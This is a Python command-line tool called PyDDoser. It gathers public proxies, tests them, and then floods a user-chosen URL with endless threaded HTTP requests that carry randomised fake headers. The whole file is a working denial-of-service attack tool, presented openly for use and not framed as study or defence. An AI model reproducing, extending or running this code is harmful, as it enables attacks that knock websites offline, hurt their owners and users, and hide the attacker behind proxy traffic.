import requests as r, os, threading, random, click, fake_headers
from threading import Thread
from colorama import Fore, Style, Back
from fake_headers import Headers
version = '1.1.0 stable :.:.'

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[0;33m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	LITBU = '\033[94m'
	YELLOW = '\033[3;33m'
	CYAN = '\033[0;36'
	colors = ['\033[92m', '\033[91m', '\033[0;33m']
	RAND = random.choice(colors)


def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def logo():
	print(bcolors.OKGREEN + '██████╗░██╗░░░██╗██████╗░██████╗░░█████╗░░██████╗███████╗██████╗░')
	print(bcolors.OKGREEN + '██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗')
	print(bcolors.OKGREEN + '██████╔╝░╚████╔╝░██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░██████╔╝')
	print(bcolors.OKGREEN + '██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║██║░░██║░╚═══██╗██╔══╝░░██╔══██╗')
	print(bcolors.OKGREEN + '██║░░░░░░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║')
	print(bcolors.OKGREEN + '╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝')
	print('')
	print(bcolors.WARNING + '               .:.: Developer: mishakorzik :.:.')
	print(bcolors.WARNING + '                 .:.: Version: '+version)
	print('')

def check_prox(array, url):
	ip = r.post("http://ip.beget.ru/").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, url))
		thread_list.append(t)
		t.start()

def check(ip, prox, url):
	try:
		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
	except:
		ipx = ip
	if ip != ipx:
		print(Fore.BLACK+Back.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+"{} send requests...".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="<File with a proxy>")
@click.option('--url', '-u', help="<URL>")
def main(proxy, url):
	clear()
	logo()
	if url == None:
		print(bcolors.LITBU + "Enter the full URL example: https://google.com\nEnter a country to serach proxy example: EN, RU, UA, or: all")
		url = input(bcolors.LITBU + "URL site: ")
		country = input(bcolors.LITBU + "Proxy country: ")
		if country == None:
			country = "all"
	if url[:4] != "http":
		print(Fore.RED+"Enter the full URL (example: https://google.com/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req = r.get("https://api.proxyscrape.com/v2/?request=displayproxies&country="+country+'')
			array = req.text.split()
			print(Back.YELLOW+Fore.WHITE+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()
